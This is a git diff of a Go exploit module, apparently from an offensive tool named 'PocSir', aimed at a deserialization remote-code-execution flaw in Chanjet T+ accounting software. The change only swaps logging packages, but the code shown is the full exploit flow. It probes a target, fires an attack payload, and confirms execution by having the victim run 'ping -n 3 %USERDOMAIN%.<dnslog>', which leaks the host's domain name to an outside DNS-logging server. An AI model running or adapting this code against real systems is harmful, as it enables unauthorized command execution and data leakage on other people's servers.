@@ -1,7 +1,6 @@
 package poc
 
 import (
-	"PocSir/common"
 	"PocSir/config"
 	"bytes"
 	"crypto/tls"
@@ -46,7 +45,7 @@ func Tplus_RCE(target string) {
 
 	req1, err := http.NewRequest("POST", pocUrl, bytes.NewBuffer(verifyPoc))
 	if err != nil {
-		common.ErrMsg.Printf("[-]Error creating request: %v\n", err)
+		config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
 		return
 	}
 
@@ -55,18 +54,18 @@ func Tplus_RCE(target string) {
 	}
 	resp1, err := client.Do(req1)
 	if err != nil {
-		common.ErrMsg.Printf("[-]%s is timeout\n", target)
+		config.ErrMsg.Printf("[-]%s is timeout\n", target)
 		return
 	}
 
 	defer resp1.Body.Close()
 	body, _ := io.ReadAll(resp1.Body)
 	if resp1.StatusCode == http.StatusOK && strings.Contains(string(body), "archivesId") {
-		common.Right.Printf("[+]%s存在畅捷通T+ GetStoreWarehouseByStore反序列化漏洞\n", target)
+		config.Right.Printf("[+]%s存在畅捷通T+ GetStoreWarehouseByStore反序列化漏洞\n", target)
 
 		req2, err2 := http.NewRequest("POST", pocUrl, bytes.NewBuffer([]byte(attackPoc)))
 		if err2 != nil {
-			common.ErrMsg.Printf("[-]Error creating request: %v\n", err)
+			config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
 			return
 		}
 		for key, value := range headers {
@@ -74,18 +73,18 @@ func Tplus_RCE(target string) {
 		}
 		resp2, err3 := client.Do(req2)
 		if err3 != nil {
-			common.ErrMsg.Printf("[-]%s is timeout\n", target)
+			config.ErrMsg.Printf("[-]%s is timeout\n", target)
 			return
 		}
 		defer resp2.Body.Close()
 		body2, _ := io.ReadAll(resp2.Body)
 		if resp2.StatusCode == http.StatusOK && strings.Contains(string(body2), "archivesId") {
-			common.Right.Printf("[+]ping -n 3 %%USERDOMAIN%%.%s 命令执行成功,请查看您的dnslog平台\n", dnslog)
+			config.Right.Printf("[+]ping -n 3 %%USERDOMAIN%%.%s 命令执行成功,请查看您的dnslog平台\n", dnslog)
 		} else {
-			common.Right.Printf("[-]ping -n 3 %%USERDOMAIN%%.%s 命令执行失败,请重试或检查服务器通信\n", dnslog)
+			config.Right.Printf("[-]ping -n 3 %%USERDOMAIN%%.%s 命令执行失败,请重试或检查服务器通信\n", dnslog)
 		}
 	} else {
-		common.ErrMsg.Printf("[-]%s不存在畅捷通T+ GetStoreWarehouseByStore反序列化漏洞\n", target)
+		config.ErrMsg.Printf("[-]%s不存在畅捷通T+ GetStoreWarehouseByStore反序列化漏洞\n", target)
 	}
 
 }
